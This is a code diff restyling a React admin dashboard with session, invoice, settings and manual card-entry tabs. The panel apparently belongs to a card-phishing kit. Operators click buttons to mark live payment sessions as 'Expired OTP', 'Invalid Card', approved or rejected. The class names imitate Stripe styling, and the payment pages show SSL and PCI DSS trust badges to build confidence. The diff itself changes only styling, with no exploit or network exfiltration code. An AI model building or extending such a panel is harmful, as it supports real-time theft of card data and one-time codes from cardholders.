-                          <Button size="sm" variant="outline" className="gap-1.5 bg-amber-500/10 border-amber-500/20 text-amber-400 hover:bg-amber-500/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_expired"); }}>
-                            <Clock className="h-3.5 w-3.5" /> Expired OTP
+                          <Button size="sm" variant="outline" className="gap-1.5 bg-amber-500/[0.08] border-amber-500/20 text-amber-400 hover:bg-amber-500/15 rounded-lg" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "otp_expired"); }}>
+                            <Clock className="h-3.5 w-3.5" /> Expired
                           </Button>
-                          <Button size="sm" variant="outline" className="gap-1.5 bg-pink-500/10 border-pink-500/20 text-pink-400 hover:bg-pink-500/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "card_invalid"); }}>
-                            <CreditCard className="h-3.5 w-3.5" /> Invalid Card
+                          <Button size="sm" variant="outline" className="gap-1.5 bg-pink-500/[0.08] border-pink-500/20 text-pink-400 hover:bg-pink-500/15 rounded-lg" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "card_invalid"); }}>
+                            <CreditCard className="h-3.5 w-3.5" /> Invalid
                           </Button>
-                          <Button size="sm" className="gap-1.5 bg-emerald-600 hover:bg-emerald-500 text-white border-0" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "success"); }}>
+                          <div className="h-6 w-px bg-white/[0.06] hidden sm:block" />
+                          <Button size="sm" className="gap-1.5 bg-emerald-600 hover:bg-emerald-500 text-white border-0 rounded-lg shadow-sm shadow-emerald-600/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "success"); }}>
                             <CheckCircle className="h-3.5 w-3.5" /> Approve
                           </Button>
-                          <Button size="sm" className="gap-1.5 bg-red-600 hover:bg-red-500 text-white border-0" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "rejected"); }}>
+                          <Button size="sm" className="gap-1.5 bg-red-600 hover:bg-red-500 text-white border-0 rounded-lg shadow-sm shadow-red-600/20" onClick={(e) => { e.stopPropagation(); updateSessionStatus(s.id, "rejected"); }}>
                             <XCircle className="h-3.5 w-3.5" /> Reject
                           </Button>
                           <div className="flex-1" />
-                          <Button size="sm" variant="outline" className="gap-1.5 bg-red-500/10 border-red-500/20 text-red-400 hover:bg-red-500/20" onClick={(e) => { e.stopPropagation(); deleteSession(s.id); }}>
-                            <Trash2 className="h-3.5 w-3.5" /> Delete
+                          <Button size="sm" variant="outline" className="gap-1.5 bg-red-500/[0.06] border-red-500/15 text-red-400/70 hover:bg-red-500/15 hover:text-red-400 rounded-lg" onClick={(e) => { e.stopPropagation(); deleteSession(s.id); }}>
+                            <Trash2 className="h-3.5 w-3.5" />
                           </Button>
                         </div>
                       </div>
@@ -610,69 +667,63 @@ const Admin = () => {
 
       {/* ========== INVOICES TAB ========== */}
       {activeTab === "invoices" && (
-        <div className="max-w-6xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
-          {/* Invoice Stats */}
-          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
-            {[
-              { label: "Total Invoices", value: invoiceStats.total, icon: FileText, accent: "text-blue-400" },
-              { label: "Unpaid", value: invoiceStats.unpaid, icon: Clock, accent: "text-yellow-400" },
-              { label: "Paid", value: invoiceStats.paid, icon: CheckCircle, accent: "text-emerald-400" },
-              { label: "Revenue", value: formatEuro(invoiceStats.totalRevenue), icon: DollarSign, accent: "text-emerald-400", isString: true },
-            ].map((stat) => (
-              <div key={stat.label} className="bg-[#111827] rounded-xl border border-white/[0.06] p-4 sm:p-5 hover:border-white/[0.1] transition-colors">
-                <div className="flex items-center justify-between mb-2">
-                  <span className="text-[11px] font-medium text-white/40 uppercase tracking-wide">{stat.label}</span>
-                  <stat.icon className={`h-4 w-4 ${stat.accent} opacity-70`} />
-                </div>
-                <p className="text-2xl sm:text-3xl font-bold text-white tracking-tight">{stat.value}</p>
-              </div>
-            ))}
+        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
+          <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
+            <StatCard label="Total Invoices" value={invoiceStats.total} icon={FileText} gradient="bg-gradient-to-br from-blue-500/[0.06] to-transparent" delay={0} />
+            <StatCard label="Unpaid" value={invoiceStats.unpaid} icon={Clock} gradient="bg-gradient-to-br from-yellow-500/[0.06] to-transparent" delay={50} />
+            <StatCard label="Paid" value={invoiceStats.paid} icon={CheckCircle} gradient="bg-gradient-to-br from-emerald-500/[0.06] to-transparent" delay={100} />
+            <StatCard label="Revenue" value={formatEuro(invoiceStats.totalRevenue)} icon={TrendingUp} gradient="bg-gradient-to-br from-emerald-500/[0.06] to-transparent" delay={150} />
           </div>
 
           <div className="flex items-center justify-between">
             <div>
-              <h2 className="text-lg font-semibold text-white">Invoices</h2>
-              <p className="text-xs text-white/30 mt-0.5">Create and manage client invoices</p>
+              <h2 className="text-lg font-display font-bold text-white tracking-tight">Invoices</h2>
+              <p className="text-xs text-white/25 mt-1">Create and manage client invoices</p>
             </div>
-            <Button size="sm" className="gap-1.5 bg-blue-600 hover:bg-blue-500 text-white border-0" onClick={() => setShowInvoiceForm(!showInvoiceForm)}>
+            <Button size="sm" className="gap-1.5 bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white border-0 rounded-xl shadow-lg shadow-blue-600/20 font-semibold" onClick={() => setShowInvoiceForm(!showInvoiceForm)}>
               <Plus className="h-3.5 w-3.5" /> New Invoice
             </Button>
           </div>
 
           {/* New Invoice Form */}
           {showInvoiceForm && (
-            <div className="bg-[#111827] rounded-xl border border-blue-500/20 p-6 shadow-lg shadow-blue-500/5">
-              <h3 className="text-white font-semibold mb-4">Create Invoice</h3>
-              <form onSubmit={handleCreateInvoice} className="grid grid-cols-1 sm:grid-cols-2 gap-4">
+            <div className="bg-[#0d1117]/80 rounded-2xl border border-blue-500/20 p-6 sm:p-8 shadow-xl shadow-blue-500/[0.05] backdrop-blur-sm animate-stripe-slide">
+              <h3 className="text-white font-display font-bold mb-6 flex items-center gap-2">
+                <div className="h-7 w-7 rounded-lg bg-blue-500/15 flex items-center justify-center">
+                  <FileText className="h-3.5 w-3.5 text-blue-400" />
+                </div>
+                Create Invoice
+              </h3>
+              <form onSubmit={handleCreateInvoice} className="grid grid-cols-1 sm:grid-cols-2 gap-5">
                 <div>
-                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Invoice Number</label>
-                  <Input value={invoiceForm.invoice_number} onChange={(e) => setInvoiceForm(f => ({ ...f, invoice_number: e.target.value }))} placeholder="INV20260001 (auto if empty)" className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
+                  <label className="text-[11px] uppercase tracking-wider font-bold text-white/30 mb-1.5 block">Invoice Number</label>
+                  <Input value={invoiceForm.invoice_number} onChange={(e) => setInvoiceForm(f => ({ ...f, invoice_number: e.target.value }))} placeholder="INV20260001 (auto if empty)" className="bg-white/[0.04] border-white/[0.08] text-white placeholder:text-white/20 rounded-xl h-11" />
                 </div>
                 <div>
-                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Client Name *</label>
-                  <Input value={invoiceForm.client_name} onChange={(e) => setInvoiceForm(f => ({ ...f, client_name: e.target.value }))} placeholder="John Doe" required className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
+                  <label className="text-[11px] uppercase tracking-wider font-bold text-white/30 mb-1.5 block">Client Name *</label>
+                  <Input value={invoiceForm.client_name} onChange={(e) => setInvoiceForm(f => ({ ...f, client_name: e.target.value }))} placeholder="John Doe" required className="bg-white/[0.04] border-white/[0.08] text-white placeholder:text-white/20 rounded-xl h-11" />
                 </div>
                 <div>
-                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Client Email</label>
-                  <Input type="email" value={invoiceForm.client_email} onChange={(e) => setInvoiceForm(f => ({ ...f, client_email: e.target.value }))} placeholder="john@example.com" className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
+                  <label className="text-[11px] uppercase tracking-wider font-bold text-white/30 mb-1.5 block">Client Email</label>
+                  <Input type="email" value={invoiceForm.client_email} onChange={(e) => setInvoiceForm(f => ({ ...f, client_email: e.target.value }))} placeholder="john@example.com" className="bg-white/[0.04] border-white/[0.08] text-white placeholder:text-white/20 rounded-xl h-11" />
                 </div>
                 <div>
-                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Amount (€) *</label>
-                  <Input type="number" step="0.01" min="1" value={invoiceForm.amount} onChange={(e) => setInvoiceForm(f => ({ ...f, amount: e.target.value }))} placeholder="1000.00" required className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
+                  <label className="text-[11px] uppercase tracking-wider font-bold text-white/30 mb-1.5 block">Amount (€) *</label>
+                  <Input type="number" step="0.01" min="1" value={invoiceForm.amount} onChange={(e) => setInvoiceForm(f => ({ ...f, amount: e.target.value }))} placeholder="1000.00" required className="bg-white/[0.04] border-white/[0.08] text-white placeholder:text-white/20 rounded-xl h-11" />
                 </div>
                 <div>
-                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Due Date</label>
-                  <Input type="date" value={invoiceForm.due_date} onChange={(e) => setInvoiceForm(f => ({ ...f, due_date: e.target.value }))} className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
+                  <label className="text-[11px] uppercase tracking-wider font-bold text-white/30 mb-1.5 block">Due Date</label>
+                  <Input type="date" value={invoiceForm.due_date} onChange={(e) => setInvoiceForm(f => ({ ...f, due_date: e.target.value }))} className="bg-white/[0.04] border-white/[0.08] text-white placeholder:text-white/20 rounded-xl h-11" />
                 </div>
                 <div className="sm:col-span-2">
-                  <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1 block">Description</label>
-                  <Input value={invoiceForm.description} onChange={(e) => setInvoiceForm(f => ({ ...f, description: e.target.value }))} placeholder="Payment for services rendered" className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
+                  <label className="text-[11px] uppercase tracking-wider font-bold text-white/30 mb-1.5 block">Description</label>
+                  <Input value={invoiceForm.description} onChange={(e) => setInvoiceForm(f => ({ ...f, description: e.target.value }))} placeholder="Payment for services rendered" className="bg-white/[0.04] border-white/[0.08] text-white placeholder:text-white/20 rounded-xl h-11" />
                 </div>
-                <div className="sm:col-span-2 flex gap-2">
-                  <Button type="submit" disabled={invoiceLoading} className="bg-blue-600 hover:bg-blue-500 text-white border-0">
+                <div className="sm:col-span-2 flex gap-3">
+                  <Button type="submit" disabled={invoiceLoading} className="bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white border-0 rounded-xl shadow-sm shadow-blue-600/20">
                     {invoiceLoading ? "Creating…" : "Create Invoice"}
                   </Button>
-                  <Button type="button" variant="outline" onClick={() => setShowInvoiceForm(false)} className="bg-white/[0.04] border-white/[0.08] text-white/60 hover:text-white">Cancel</Button>
+                  <Button type="button" variant="outline" onClick={() => setShowInvoiceForm(false)} className="bg-white/[0.03] border-white/[0.06] text-white/50 hover:text-white rounded-xl">Cancel</Button>
                 </div>
               </form>
             </div>
@@ -680,44 +731,49 @@ const Admin = () => {
 
           {/* Invoice List */}
           {invoices.length === 0 ? (
-            <div className="bg-[#111827] rounded-xl border border-white/[0.06] p-16 text-center">
-              <FileText className="h-10 w-10 text-white/10 mx-auto mb-3" />
-              <p className="text-white/40 text-sm font-medium">No invoices yet</p>
-              <p className="text-white/20 text-xs mt-1">Create your first invoice above</p>
+            <div className="bg-[#0d1117]/60 rounded-2xl border border-white/[0.06] p-20 text-center backdrop-blur-sm">
+              <div className="h-14 w-14 rounded-2xl bg-white/[0.03] border border-white/[0.06] flex items-center justify-center mx-auto mb-4">
+                <FileText className="h-6 w-6 text-white/15" />
+              </div>
+              <p className="text-white/35 text-sm font-semibold">No invoices yet</p>
+              <p className="text-white/15 text-xs mt-1.5">Create your first invoice above</p>
             </div>
           ) : (
-            <div className="space-y-2.5">
-              {invoices.map((inv) => (
-                <div key={inv.id} className="bg-[#111827] rounded-xl border border-white/[0.06] hover:border-white/[0.1] transition-colors p-4 sm:p-5">
+            <div className="space-y-3">
+              {invoices.map((inv, i) => (
+                <div key={inv.id} className="bg-[#0d1117]/60 rounded-2xl border border-white/[0.06] hover:border-white/[0.1] transition-all duration-300 p-5 sm:p-6 backdrop-blur-sm animate-stripe-slide" style={{ animationDelay: `${i * 30}ms` }}>
                   <div className="flex items-center gap-4">
+                    <div className="h-10 w-10 rounded-xl bg-blue-500/[0.08] border border-blue-500/15 flex items-center justify-center shrink-0">
+                      <FileText className="h-4 w-4 text-blue-400" />
+                    </div>
                     <div className="flex-1 min-w-0">
                       <div className="flex items-center gap-2.5 mb-1">
-                        <span className="text-sm font-mono font-semibold text-blue-400">{inv.invoice_number}</span>
+                        <span className="text-sm font-mono font-bold text-blue-400">{inv.invoice_number}</span>
                         {getInvoiceStatusBadge(inv.status)}
                       </div>
-                      <div className="flex items-center gap-3 text-sm text-white/50">
-                        <span>{inv.client_name}</span>
-                        {inv.client_email && <span className="text-white/30">· {inv.client_email}</span>}
+                      <div className="flex items-center gap-3 text-sm text-white/40">
+                        <span className="font-medium">{inv.client_name}</span>
+                        {inv.client_email && <span className="text-white/20">· {inv.client_email}</span>}
                       </div>
-                      {inv.description && <p className="text-xs text-white/30 mt-1">{inv.description}</p>}
+                      {inv.description && <p className="text-xs text-white/20 mt-1">{inv.description}</p>}
                     </div>
                     <div className="text-right shrink-0">
                       <p className="text-lg font-bold text-white tabular-nums">{formatEuro(parseFloat(inv.amount))}</p>
                       {inv.due_date && (
-                        <p className="text-[10px] text-white/30">Due {new Date(inv.due_date).toLocaleDateString("en-GB", { day: "2-digit", month: "short" })}</p>
+                        <p className="text-[10px] text-white/25 font-medium">Due {new Date(inv.due_date).toLocaleDateString("en-GB", { day: "2-digit", month: "short" })}</p>
                       )}
                     </div>
                     <div className="flex items-center gap-1.5 shrink-0">
-                      <Button size="sm" variant="outline" className="gap-1 bg-blue-500/10 border-blue-500/20 text-blue-400 hover:bg-blue-500/20" onClick={() => { setInvoiceFilter(inv.id); setActiveTab("sessions"); }}>
-                        <Activity className="h-3 w-3" /> Sessions
+                      <Button size="sm" variant="outline" className="gap-1 bg-blue-500/[0.08] border-blue-500/15 text-blue-400 hover:bg-blue-500/15 rounded-lg" onClick={() => { setInvoiceFilter(inv.id); setActiveTab("sessions"); }}>
+                        <Activity className="h-3 w-3" /> <span className="hidden sm:inline">Sessions</span>
                       </Button>
-                      <Button size="sm" variant="outline" className="gap-1 bg-white/[0.04] border-white/[0.08] text-white/60 hover:text-white hover:bg-white/[0.08]" onClick={() => copyPaymentLink(inv.id)}>
-                        <Copy className="h-3 w-3" /> Link
+                      <Button size="sm" variant="outline" className="gap-1 bg-white/[0.03] border-white/[0.06] text-white/50 hover:text-white hover:bg-white/[0.06] rounded-lg" onClick={() => copyPaymentLink(inv.id)}>
+                        <Copy className="h-3 w-3" /> <span className="hidden sm:inline">Link</span>
                       </Button>
-                      <Button size="sm" variant="outline" className="gap-1 bg-white/[0.04] border-white/[0.08] text-white/60 hover:text-white hover:bg-white/[0.08]" onClick={() => window.open(`/pay/${inv.id}`, "_blank")}>
+                      <Button size="sm" variant="outline" className="bg-white/[0.03] border-white/[0.06] text-white/50 hover:text-white hover:bg-white/[0.06] rounded-lg" onClick={() => window.open(`/pay/${inv.id}`, "_blank")}>
                         <ExternalLink className="h-3 w-3" />
                       </Button>
-                      <Button size="sm" variant="outline" className="gap-1 bg-red-500/10 border-red-500/20 text-red-400 hover:bg-red-500/20" onClick={() => deleteInvoice(inv.id)}>
+                      <Button size="sm" variant="outline" className="bg-red-500/[0.06] border-red-500/15 text-red-400/60 hover:bg-red-500/15 hover:text-red-400 rounded-lg" onClick={() => deleteInvoice(inv.id)}>
                         <Trash2 className="h-3 w-3" />
                       </Button>
                     </div>
@@ -731,39 +787,41 @@ const Admin = () => {
 
       {/* ========== SETTINGS TAB ========== */}
       {activeTab === "settings" && (
-        <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-6 space-y-6">
+        <div className="max-w-2xl mx-auto px-4 sm:px-6 lg:px-8 py-8 space-y-8">
           <div>
-            <h2 className="text-lg font-semibold text-white">Business Settings</h2>
-            <p className="text-xs text-white/30 mt-0.5">Configure your company details shown on invoices and payment pages</p>
+            <h2 className="text-lg font-display font-bold text-white tracking-tight">Business Settings</h2>
+            <p className="text-xs text-white/25 mt-1">Configure your company details shown on invoices and payment pages</p>
           </div>
 
-          <div className="bg-[#111827] rounded-xl border border-white/[0.06] p-6">
-            <form onSubmit={handleSaveSettings} className="space-y-5">
+          <div className="bg-[#0d1117]/80 rounded-2xl border border-white/[0.06] p-6 sm:p-8 backdrop-blur-sm">
+            <form onSubmit={handleSaveSettings} className="space-y-6">
               <div>
-                <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1.5 block">Company Name *</label>
-                <Input value={settingsForm.company_name} onChange={(e) => setSettingsForm(f => ({ ...f, company_name: e.target.value }))} placeholder="Your Company Name" required className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
-                <p className="text-[10px] text-white/20 mt-1">This appears on invoices and payment pages</p>
+                <label className="text-[11px] uppercase tracking-wider font-bold text-white/30 mb-2 block">Company Name *</label>
+                <Input value={settingsForm.company_name} onChange={(e) => setSettingsForm(f => ({ ...f, company_name: e.target.value }))} placeholder="Your Company Name" required className="bg-white/[0.04] border-white/[0.08] text-white placeholder:text-white/20 rounded-xl h-11" />
+                <p className="text-[10px] text-white/15 mt-1.5">This appears on invoices and payment pages</p>
               </div>
               <div>
-                <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1.5 block">Contact Email</label>
-                <Input type="email" value={settingsForm.contact_email} onChange={(e) => setSettingsForm(f => ({ ...f, contact_email: e.target.value }))} placeholder="billing@company.com" className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
+                <label className="text-[11px] uppercase tracking-wider font-bold text-white/30 mb-2 block">Contact Email</label>
+                <Input type="email" value={settingsForm.contact_email} onChange={(e) => setSettingsForm(f => ({ ...f, contact_email: e.target.value }))} placeholder="billing@company.com" className="bg-white/[0.04] border-white/[0.08] text-white placeholder:text-white/20 rounded-xl h-11" />
               </div>
               <div>
-                <label className="text-[11px] uppercase tracking-wider font-semibold text-white/40 mb-1.5 block">Website</label>
-                <Input value={settingsForm.website} onChange={(e) => setSettingsForm(f => ({ ...f, website: e.target.value }))} placeholder="https://company.com" className="bg-white/5 border-white/10 text-white placeholder:text-white/30" />
+                <label className="text-[11px] uppercase tracking-wider font-bold text-white/30 mb-2 block">Website</label>
+                <Input value={settingsForm.website} onChange={(e) => setSettingsForm(f => ({ ...f, website: e.target.value }))} placeholder="https://company.com" className="bg-white/[0.04] border-white/[0.08] text-white placeholder:text-white/20 rounded-xl h-11" />
               </div>
-              <Button type="submit" disabled={settingsLoading} className="bg-blue-600 hover:bg-blue-500 text-white border-0">
+              <Button type="submit" disabled={settingsLoading} className="bg-gradient-to-r from-blue-600 to-blue-500 hover:from-blue-500 hover:to-blue-400 text-white border-0 rounded-xl shadow-sm shadow-blue-600/20">
                 {settingsLoading ? "Saving…" : "Save Settings"}
               </Button>
             </form>
           </div>
 
-          {/* Trust & Security Info */}
-          <div className="bg-[#111827] rounded-xl border border-white/[0.06] p-6">
-            <h3 className="text-sm font-semibold text-white mb-3 flex items-center gap-2">
-              <ShieldCheck className="h-4 w-4 text-emerald-400" /> Security & Trust Signals
+          <div className="bg-[#0d1117]/80 rounded-2xl border border-white/[0.06] p-6 sm:p-8 backdrop-blur-sm">
+            <h3 className="text-sm font-display font-bold text-white mb-3 flex items-center gap-2.5">
+              <div className="h-7 w-7 rounded-lg bg-emerald-500/15 flex items-center justify-center">
+                <ShieldCheck className="h-3.5 w-3.5 text-emerald-400" />
+              </div>
+              Security & Trust Signals
             </h3>
-            <p className="text-xs text-white/40 leading-relaxed">
+            <p className="text-xs text-white/30 leading-relaxed">
               Your payment pages automatically display trust signals including SSL encryption badges and PCI DSS compliance messaging. These are shown to all clients on the checkout page to build confidence and trust.
             </p>
           </div>
@@ -772,14 +830,14 @@ const Admin = () => {
 
       {/* ========== MANUAL ENTRY TAB ========== */}
       {activeTab === "form" && (
-        <div className="min-h-[calc(100vh-57px)] flex">
+        <div className="min-h-[calc(100vh-65px)] flex">
           <div className="hidden lg:flex lg:w-[480px] xl:w-[520px] flex-col justify-between p-10 xl:p-14 bg-stripe-bg">
             <div>
               <div className="space-y-6">
                 <div>
                   <p className="text-white/50 text-sm">Manual Card Entry</p>
                   <p className="text-white/40 text-xs mt-0.5">Business Portal</p>
-                  <p className="text-white text-4xl font-bold tracking-tight mt-1">
+                  <p className="text-white text-4xl font-display font-bold tracking-tight mt-1">
                     {isValidAmount ? formatEuro(total) : "€0.00"}
                   </p>
                 </div>
@@ -810,7 +868,7 @@ const Admin = () => {
             <div className="w-full max-w-[440px] py-10 px-5 sm:px-0 sm:py-14">
               <div className="lg:hidden mb-8">
                 <p className="text-muted-foreground text-sm">Manual Card Entry</p>
-                <p className="text-foreground text-3xl font-bold tracking-tight mt-1">
+                <p className="text-foreground text-3xl font-display font-bold tracking-tight mt-1">
                   {isValidAmount ? formatEuro(total) : "€0.00"}
                 </p>
                 {isValidAmount && (
